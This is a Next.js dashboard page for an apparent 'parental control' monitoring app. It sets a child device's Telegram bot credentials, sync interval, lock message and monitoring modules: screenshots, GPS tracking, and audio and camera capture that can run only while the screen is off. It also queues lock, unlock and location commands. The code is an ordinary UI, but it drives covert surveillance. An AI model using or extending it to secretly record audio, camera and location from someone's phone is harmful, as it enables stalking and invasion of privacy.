'use client';

import { use, useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';
import {
  ArrowLeft,
  Battery,
  BatteryCharging,
  MapPin,
  Lock,
  Unlock,
  Save,
  Trash2,
  Clock,
  ExternalLink,
  Sliders,
  Terminal,
  Activity,
  Send,
  Camera,
  Mic,
  Monitor,
  CheckCircle,
  Zap,
} from 'lucide-react';

interface DeviceDetail {
  _id: string;
  deviceName: string;
  deviceModel: string;
  deviceToken: string;
  batteryLevel?: number;
  isCharging?: boolean;
  isLocked: boolean;
  lockMessage?: string;
  lastLocation?: {
    latitude: number;
    longitude: number;
    accuracy?: number;
    timestamp?: string;
  };
  settings: {
    syncIntervalSeconds?: number;
    syncIntervalMinutes?: number;
    telegramBotToken: string;
    telegramChatId: string;
    isMonitoringActive: boolean;
    sendScreenshot: boolean;
    screenshotInterval: number;
    sendLocation: boolean;
    locationInterval: number;
    sendAudio: boolean;
    audioDuration: number;
    audioScreenOff: boolean;
    sendCamera: boolean;
    cameraInterval: number;
    cameraScreenOff: boolean;
    lockMessage?: string;
  };
  lastSyncAt?: string;
  appVersion?: string;
  createdAt: string;
}

interface CommandItem {
  _id: string;
  type: string;
  status: string;
  params: Record<string, any>;
  createdAt: string;
  executedAt?: string;
}

export default function DeviceDetailPage({
  params,
}: {
  params: Promise<{ id: string }>;
}) {
  const { id } = use(params);
  const router = useRouter();

  const [device, setDevice] = useState<DeviceDetail | null>(null);
  const [commands, setCommands] = useState<CommandItem[]>([]);
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [saveSuccess, setSaveSuccess] = useState(false);
  const [actionLoading, setActionLoading] = useState(false);

  // Form states
  const [deviceName, setDeviceName] = useState('');
  const [syncInterval, setSyncInterval] = useState(5); // in seconds, min 5s
  const [telegramBotToken, setTelegramBotToken] = useState('');
  const [telegramChatId, setTelegramChatId] = useState('');
  const [isMonitoringActive, setIsMonitoringActive] = useState(true);
  const [sendScreenshot, setSendScreenshot] = useState(true);
  const [screenshotInterval, setScreenshotInterval] = useState(10);
  const [sendLocation, setSendLocation] = useState(true);
  const [locationInterval, setLocationInterval] = useState(10);
  const [sendAudio, setSendAudio] = useState(false);
  const [audioDuration, setAudioDuration] = useState(60);
  const [audioScreenOff, setAudioScreenOff] = useState(false);
  const [sendCamera, setSendCamera] = useState(false);
  const [cameraInterval, setCameraInterval] = useState(10);
  const [cameraScreenOff, setCameraScreenOff] = useState(false);
  const [lockMessage, setLockMessage] = useState('');

  const fetchDeviceData = async () => {
    try {
      const res = await fetch(`/api/dashboard/devices/${id}`);
      if (!res.ok) {
        if (res.status === 401) router.push('/login');
        return;
      }
      const data = await res.json();
      setDevice(data.device);
      setCommands(data.recentCommands || []);

      if (data.device) {
        setDeviceName(data.device.deviceName || '');
        const s = data.device.settings || {};
        const currentSeconds = s.syncIntervalSeconds || (s.syncIntervalMinutes ? s.syncIntervalMinutes * 60 : 5);
        setSyncInterval(Math.max(5, currentSeconds));
        setTelegramBotToken(s.telegramBotToken || '');
        setTelegramChatId(s.telegramChatId || '');
        setIsMonitoringActive(s.isMonitoringActive ?? true);
        setSendScreenshot(s.sendScreenshot ?? true);
        setScreenshotInterval(s.screenshotInterval || 10);
        setSendLocation(s.sendLocation ?? true);
        setLocationInterval(s.locationInterval || 10);
        setSendAudio(s.sendAudio ?? false);
        setAudioDuration(s.audioDuration || 60);
        setAudioScreenOff(s.audioScreenOff ?? false);
        setSendCamera(s.sendCamera ?? false);
        setCameraInterval(s.cameraInterval || 10);
        setCameraScreenOff(s.cameraScreenOff ?? false);
        setLockMessage(data.device.lockMessage || 'This device is locked by parental control.');
      }
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchDeviceData();
    const interval = setInterval(fetchDeviceData, 3000); // Poll every 3s for fast updates
    return () => clearInterval(interval);
  }, [id]);

  const handleSaveSettings = async (e: React.FormEvent) => {
    e.preventDefault();
    setSaving(true);
    setSaveSuccess(false);
    try {
      const res = await fetch(`/api/dashboard/devices/${id}/settings`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          deviceName,
          syncIntervalSeconds: Math.max(5, Number(syncInterval)),
          telegramBotToken,
          telegramChatId,
          isMonitoringActive,
          sendScreenshot,
          screenshotInterval: Number(screenshotInterval),
          sendLocation,
          locationInterval: Number(locationInterval),
          sendAudio,
          audioDuration: Number(audioDuration),
          audioScreenOff,
          sendCamera,
          cameraInterval: Number(cameraInterval),
          cameraScreenOff,
          lockMessage,
        }),
      });

      if (!res.ok) {
        throw new Error('Failed to save settings');
      }

      setSaveSuccess(true);
      setTimeout(() => setSaveSuccess(false), 4000);
      fetchDeviceData();
    } catch (err: any) {
      alert(err.message);
    } finally {
      setSaving(false);
    }
  };

  const handleQueueCommand = async (type: string, params?: Record<string, any>) => {
    setActionLoading(true);
    try {
      const res = await fetch(`/api/dashboard/devices/${id}/command`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type, params }),
      });

      if (!res.ok) {
        throw new Error('Failed to queue action');
      }

      fetchDeviceData();
    } catch (err: any) {
      alert(err.message);
    } finally {
      setActionLoading(false);
    }
  };

  const handleDeleteDevice = async () => {
    if (!confirm('Are you sure you want to remove this device?')) return;
    try {
      await fetch(`/api/dashboard/devices/${id}`, { method: 'DELETE' });
      router.push('/dashboard');
    } catch (err: any) {
      alert(err.message);
    }
  };

  if (loading || !device) {
    return (
      <div className="min-h-screen bg-slate-950 text-slate-100 flex items-center justify-center">
        <div className="w-8 h-8 border-2 border-indigo-500 border-t-transparent rounded-full animate-spin" />
      </div>
    );
  }

  const hasLocation = device.lastLocation?.latitude && device.lastLocation?.longitude;
  const activeSyncSeconds = device.settings?.syncIntervalSeconds || (device.settings?.syncIntervalMinutes ? device.settings.syncIntervalMinutes * 60 : 5);

  const formatSyncDisplay = (sec: number) => {
    if (sec < 60) return `${sec}s`;
    const m = Math.floor(sec / 60);
    const s = sec % 60;
    return s > 0 ? `${m}m ${s}s` : `${m}m`;
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col">
      {/* Top Header */}
      <header className="border-b border-slate-800 bg-slate-900/60 backdrop-blur-md sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Link
              href="/dashboard"
              className="p-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 transition"
            >
              <ArrowLeft className="w-4 h-4" />
            </Link>
            <div>
              <h1 className="font-bold text-lg text-white">{device.deviceName}</h1>
              <p className="text-xs text-slate-400">{device.deviceModel}</p>
            </div>
          </div>

          <button
            onClick={handleDeleteDevice}
            className="p-2 rounded-lg bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/20 text-xs font-medium flex items-center gap-1.5 transition"
          >
            <Trash2 className="w-3.5 h-3.5" />
            <span className="hidden sm:inline">Remove Device</span>
          </button>
        </div>
      </header>

      {/* Main Container */}
      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 flex-1 w-full space-y-8">
        {/* Top Status Cards */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          {/* Battery */}
          <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-5 shadow-lg flex items-center justify-between">
            <div>
              <span className="text-xs uppercase font-semibold text-slate-400 block mb-1">Battery</span>
              <span className="text-2xl font-bold text-white">{device.batteryLevel ?? 100}%</span>
              <span className="text-xs text-slate-500 block mt-0.5">
                {device.isCharging ? 'Charging' : 'On Battery'}
              </span>
            </div>
            {device.isCharging ? (
              <BatteryCharging className="w-8 h-8 text-emerald-400" />
            ) : (
              <Battery className="w-8 h-8 text-slate-400" />
            )}
          </div>

          {/* Lock Status */}
          <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-5 shadow-lg flex items-center justify-between">
            <div>
              <span className="text-xs uppercase font-semibold text-slate-400 block mb-1">Lock State</span>
              <span className={`text-2xl font-bold ${device.isLocked ? 'text-amber-400' : 'text-emerald-400'}`}>
                {device.isLocked ? 'Locked' : 'Normal'}
              </span>
              <span className="text-xs text-slate-500 block mt-0.5">Screen Restriction</span>
            </div>
            {device.isLocked ? (
              <Lock className="w-8 h-8 text-amber-400" />
            ) : (
              <Unlock className="w-8 h-8 text-emerald-400" />
            )}
          </div>

          {/* Sync Frequency */}
          <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-5 shadow-lg flex items-center justify-between">
            <div>
              <span className="text-xs uppercase font-semibold text-slate-400 block mb-1">Sync Heartbeat</span>
              <div className="flex items-center gap-1.5">
                <span className="text-2xl font-bold text-indigo-400">
                  {formatSyncDisplay(activeSyncSeconds)}
                </span>
                {activeSyncSeconds <= 10 && (
                  <span className="px-1.5 py-0.5 rounded text-[10px] font-bold bg-indigo-500/20 text-indigo-300 border border-indigo-500/30">
                    FAST
                  </span>
                )}
              </div>
              <span className="text-xs text-slate-500 block mt-0.5">Min 5s interval</span>
            </div>
            <Clock className="w-8 h-8 text-indigo-400" />
          </div>

          {/* GPS Location */}
          <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-5 shadow-lg flex items-center justify-between">
            <div>
              <span className="text-xs uppercase font-semibold text-slate-400 block mb-1">GPS Location</span>
              {hasLocation ? (
                <a
                  href={`https://www.google.com/maps?q=${device.lastLocation?.latitude},${device.lastLocation?.longitude}`}
                  target="_blank"
                  rel="noreferrer"
                  className="text-sm font-semibold text-indigo-400 hover:underline flex items-center gap-1 mt-1"
                >
                  <span>Open Maps</span>
                  <ExternalLink className="w-3 h-3" />
                </a>
              ) : (
                <span className="text-sm text-slate-500">Not available</span>
              )}
              <span className="text-xs text-slate-500 block mt-1">
                {device.lastLocation?.latitude?.toFixed(4)}, {device.lastLocation?.longitude?.toFixed(4)}
              </span>
            </div>
            <MapPin className="w-8 h-8 text-red-400" />
          </div>
        </div>

        {/* Remote Settings Form */}
        <form onSubmit={handleSaveSettings} className="space-y-6">
          {saveSuccess && (
            <div className="p-4 bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-sm rounded-xl flex items-center gap-2">
              <CheckCircle className="w-5 h-5 shrink-0" />
              <span>Settings saved! They will be applied on the child device during the next heartbeat sync.</span>
            </div>
          )}

          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
            {/* 1. Telegram Dispatch Configuration */}
            <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 shadow-xl space-y-5">
              <h2 className="text-base font-bold text-white flex items-center gap-2">
                <Send className="w-4 h-4 text-sky-400" />
                Telegram Dispatch Configuration
              </h2>
              <p className="text-xs text-slate-400">
                Configure your Telegram bot credentials here. The child app downloads these automatically — no manual input on the phone needed!
              </p>

              <div>
                <label className="block text-xs font-semibold uppercase text-slate-400 mb-1.5">
                  Telegram Bot Token
                </label>
                <input
                  type="text"
                  value={telegramBotToken}
                  onChange={(e) => setTelegramBotToken(e.target.value)}
                  placeholder="e.g. 123456789:ABCdefGhIJKlmNoPQRstuvWXyz"
                  className="w-full px-3.5 py-2.5 bg-slate-950/60 border border-slate-800 rounded-xl text-sm text-slate-200 focus:outline-none focus:border-indigo-500 font-mono"
                />
              </div>

              <div>
                <label className="block text-xs font-semibold uppercase text-slate-400 mb-1.5">
                  Target Chat ID
                </label>
                <input
                  type="text"
                  value={telegramChatId}
                  onChange={(e) => setTelegramChatId(e.target.value)}
                  placeholder="e.g. 987654321"
                  className="w-full px-3.5 py-2.5 bg-slate-950/60 border border-slate-800 rounded-xl text-sm text-slate-200 focus:outline-none focus:border-indigo-500 font-mono"
                />
              </div>

              <div className="p-3 bg-slate-950/40 rounded-xl border border-slate-800 text-xs text-slate-400 flex items-center justify-between">
                <div>
                  <span className="text-white font-medium block">Monitoring Master Switch</span>
                  <span>Enable or pause all reporting loops</span>
                </div>
                <input
                  type="checkbox"
                  checked={isMonitoringActive}
                  onChange={(e) => setIsMonitoringActive(e.target.checked)}
                  className="w-5 h-5 accent-indigo-500 rounded"
                />
              </div>
            </div>

            {/* 2. Device Alias, Sync Frequency & Lock Screen */}
            <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 shadow-xl space-y-5">
              <h2 className="text-base font-bold text-white flex items-center gap-2">
                <Sliders className="w-4 h-4 text-indigo-400" />
                General Settings & Sync Frequency
              </h2>

              <div>
                <label className="block text-xs font-semibold uppercase text-slate-400 mb-1.5">
                  Device Alias
                </label>
                <input
                  type="text"
                  value={deviceName}
                  onChange={(e) => setDeviceName(e.target.value)}
                  className="w-full px-3.5 py-2 bg-slate-950/60 border border-slate-800 rounded-xl text-sm text-slate-200 focus:outline-none focus:border-indigo-500"
                />
              </div>

              <div>
                <div className="flex items-center justify-between mb-1.5">
                  <label className="text-xs font-semibold uppercase text-slate-400 flex items-center gap-1.5">
                    <Zap className="w-3.5 h-3.5 text-amber-400" />
                    Sync Heartbeat Interval: <span className="text-indigo-400 font-bold">{syncInterval}s</span>
                  </label>
                  <span className="text-[10px] text-slate-500">Min 5 seconds</span>
                </div>

                <div className="flex items-center gap-2 mb-2">
                  <input
                    type="number"
                    min={5}
                    max={86400}
                    value={syncInterval}
                    onChange={(e) => setSyncInterval(Math.max(5, Number(e.target.value)))}
                    className="w-24 px-3 py-1.5 bg-slate-950/60 border border-slate-800 rounded-xl text-sm text-white font-semibold text-center"
                  />
                  <span className="text-xs text-slate-400">seconds</span>
                </div>

                {/* Quick Presets */}
                <div className="flex flex-wrap gap-1.5 mt-2">
                  {[
                    { label: '5s (Real-time)', val: 5 },
                    { label: '10s', val: 10 },
                    { label: '30s', val: 30 },
                    { label: '1 min', val: 60 },
                    { label: '5 min', val: 300 },
                    { label: '15 min', val: 900 },
                  ].map((p) => (
                    <button
                      key={p.val}
                      type="button"
                      onClick={() => setSyncInterval(p.val)}
                      className={`px-2.5 py-1 rounded-lg text-[11px] font-medium transition ${
                        syncInterval === p.val
                          ? 'bg-indigo-600 text-white font-bold'
                          : 'bg-slate-950/60 border border-slate-800 text-slate-400 hover:text-slate-200'
                      }`}
                    >
                      {p.label}
                    </button>
                  ))}
                </div>
              </div>

              <div>
                <label className="block text-xs font-semibold uppercase text-slate-400 mb-1.5">
                  Lock Screen Message
                </label>
                <input
                  type="text"
                  value={lockMessage}
                  onChange={(e) => setLockMessage(e.target.value)}
                  placeholder="Message displayed when screen is locked"
                  className="w-full px-3.5 py-2 bg-slate-950/60 border border-slate-800 rounded-xl text-sm text-slate-200 focus:outline-none focus:border-indigo-500"
                />
              </div>

              <div className="flex items-center gap-3 pt-2">
                <button
                  type="button"
                  onClick={() =>
                    handleQueueCommand(device.isLocked ? 'UNLOCK_DEVICE' : 'LOCK_DEVICE', {
                      message: lockMessage,
                    })
                  }
                  disabled={actionLoading}
                  className={`flex-1 py-2.5 px-4 rounded-xl text-xs font-semibold flex items-center justify-center gap-2 transition ${
                    device.isLocked
                      ? 'bg-emerald-600 hover:bg-emerald-500 text-white'
                      : 'bg-amber-600 hover:bg-amber-500 text-white'
                  }`}
                >
                  {device.isLocked ? <Unlock className="w-4 h-4" /> : <Lock className="w-4 h-4" />}
                  <span>{device.isLocked ? 'Send Unlock Command' : 'Send Lock Command'}</span>
                </button>

                <button
                  type="button"
                  onClick={() => handleQueueCommand('PING_LOCATION')}
                  disabled={actionLoading}
                  className="py-2.5 px-4 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold flex items-center gap-2 transition"
                >
                  <MapPin className="w-4 h-4 text-indigo-400" />
                  <span>Request GPS</span>
                </button>
              </div>
            </div>
          </div>

          {/* 3. Monitoring Feature Toggles & Intervals */}
          <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 shadow-xl space-y-6">
            <h2 className="text-base font-bold text-white flex items-center gap-2">
              <Activity className="w-4 h-4 text-emerald-400" />
              Monitoring Modules & Intervals
            </h2>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
              {/* Screenshots */}
              <div className="p-4 bg-slate-950/60 rounded-xl border border-slate-800 space-y-3">
                <div className="flex items-center justify-between">
                  <span className="text-sm font-semibold text-white flex items-center gap-1.5">
                    <Monitor className="w-4 h-4 text-indigo-400" /> Screenshots
                  </span>
                  <input
                    type="checkbox"
                    checked={sendScreenshot}
                    onChange={(e) => setSendScreenshot(e.target.checked)}
                    className="w-4 h-4 accent-indigo-500 rounded"
                  />
                </div>
                <div>
                  <label className="text-[11px] text-slate-400 block mb-1">
                    Interval: {screenshotInterval}s
                  </label>
                  <input
                    type="number"
                    min={5}
                    max={3600}
                    value={screenshotInterval}
                    onChange={(e) => setScreenshotInterval(Number(e.target.value))}
                    className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-800 rounded-lg text-xs text-slate-200"
                  />
                </div>
              </div>

              {/* Location GPS */}
              <div className="p-4 bg-slate-950/60 rounded-xl border border-slate-800 space-y-3">
                <div className="flex items-center justify-between">
                  <span className="text-sm font-semibold text-white flex items-center gap-1.5">
                    <MapPin className="w-4 h-4 text-red-400" /> GPS Tracking
                  </span>
                  <input
                    type="checkbox"
                    checked={sendLocation}
                    onChange={(e) => setSendLocation(e.target.checked)}
                    className="w-4 h-4 accent-indigo-500 rounded"
                  />
                </div>
                <div>
                  <label className="text-[11px] text-slate-400 block mb-1">
                    Interval: {locationInterval} mins
                  </label>
                  <input
                    type="number"
                    min={1}
                    max={1440}
                    value={locationInterval}
                    onChange={(e) => setLocationInterval(Number(e.target.value))}
                    className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-800 rounded-lg text-xs text-slate-200"
                  />
                </div>
              </div>

              {/* Audio */}
              <div className="p-4 bg-slate-950/60 rounded-xl border border-slate-800 space-y-3">
                <div className="flex items-center justify-between">
                  <span className="text-sm font-semibold text-white flex items-center gap-1.5">
                    <Mic className="w-4 h-4 text-amber-400" /> Audio Record
                  </span>
                  <input
                    type="checkbox"
                    checked={sendAudio}
                    onChange={(e) => setSendAudio(e.target.checked)}
                    className="w-4 h-4 accent-indigo-500 rounded"
                  />
                </div>
                <div>
                  <label className="text-[11px] text-slate-400 block mb-1">
                    Duration: {audioDuration}s
                  </label>
                  <input
                    type="number"
                    min={5}
                    max={600}
                    value={audioDuration}
                    onChange={(e) => setAudioDuration(Number(e.target.value))}
                    className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-800 rounded-lg text-xs text-slate-200"
                  />
                </div>
                <div className="flex items-center justify-between text-[11px] text-slate-400 pt-1">
                  <span>Only when Screen OFF</span>
                  <input
                    type="checkbox"
                    checked={audioScreenOff}
                    onChange={(e) => setAudioScreenOff(e.target.checked)}
                    className="w-3.5 h-3.5 accent-indigo-500 rounded"
                  />
                </div>
              </div>

              {/* Camera */}
              <div className="p-4 bg-slate-950/60 rounded-xl border border-slate-800 space-y-3">
                <div className="flex items-center justify-between">
                  <span className="text-sm font-semibold text-white flex items-center gap-1.5">
                    <Camera className="w-4 h-4 text-emerald-400" /> Camera Snap
                  </span>
                  <input
                    type="checkbox"
                    checked={sendCamera}
                    onChange={(e) => setSendCamera(e.target.checked)}
                    className="w-4 h-4 accent-indigo-500 rounded"
                  />
                </div>
                <div>
                  <label className="text-[11px] text-slate-400 block mb-1">
                    Interval: {cameraInterval}s
                  </label>
                  <input
                    type="number"
                    min={5}
                    max={3600}
                    value={cameraInterval}
                    onChange={(e) => setCameraInterval(Number(e.target.value))}
                    className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-800 rounded-lg text-xs text-slate-200"
                  />
                </div>
                <div className="flex items-center justify-between text-[11px] text-slate-400 pt-1">
                  <span>Only when Screen OFF</span>
                  <input
                    type="checkbox"
                    checked={cameraScreenOff}
                    onChange={(e) => setCameraScreenOff(e.target.checked)}
                    className="w-3.5 h-3.5 accent-indigo-500 rounded"
                  />
                </div>
              </div>
            </div>

            {/* Save Button */}
            <div className="pt-4 border-t border-slate-800 flex justify-end">
              <button
                type="submit"
                disabled={saving}
                className="py-3 px-8 bg-indigo-600 hover:bg-indigo-500 text-white rounded-xl text-sm font-semibold flex items-center gap-2 transition shadow-lg shadow-indigo-600/20 disabled:opacity-50"
              >
                <Save className="w-4 h-4" />
                <span>{saving ? 'Saving...' : 'Save All Settings to Device'}</span>
              </button>
            </div>
          </div>
        </form>

        {/* Command Queue Table */}
        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 shadow-xl">
          <h2 className="text-base font-bold text-white flex items-center gap-2 mb-4">
            <Terminal className="w-4 h-4 text-indigo-400" />
            Recent Command Queue
          </h2>

          {commands.length === 0 ? (
            <p className="text-xs text-slate-500">No commands queued recently.</p>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs text-slate-300">
                <thead className="border-b border-slate-800 text-slate-500 uppercase">
                  <tr>
                    <th className="py-2.5 px-3">Command</th>
                    <th className="py-2.5 px-3">Status</th>
                    <th className="py-2.5 px-3">Queued At</th>
                    <th className="py-2.5 px-3">Executed At</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-800/60">
                  {commands.map((cmd) => (
                    <tr key={cmd._id} className="hover:bg-slate-950/30">
                      <td className="py-2.5 px-3 font-mono font-semibold text-indigo-400">{cmd.type}</td>
                      <td className="py-2.5 px-3">
                        <span
                          className={`px-2 py-0.5 rounded text-[10px] font-semibold ${
                            cmd.status === 'EXECUTED'
                              ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                              : cmd.status === 'PENDING'
                              ? 'bg-amber-500/20 text-amber-400 border border-amber-500/30'
                              : 'bg-slate-800 text-slate-400'
                          }`}
                        >
                          {cmd.status}
                        </span>
                      </td>
                      <td className="py-2.5 px-3 text-slate-400">{new Date(cmd.createdAt).toLocaleTimeString()}</td>
                      <td className="py-2.5 px-3 text-slate-400">
                        {cmd.executedAt ? new Date(cmd.executedAt).toLocaleTimeString() : '—'}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
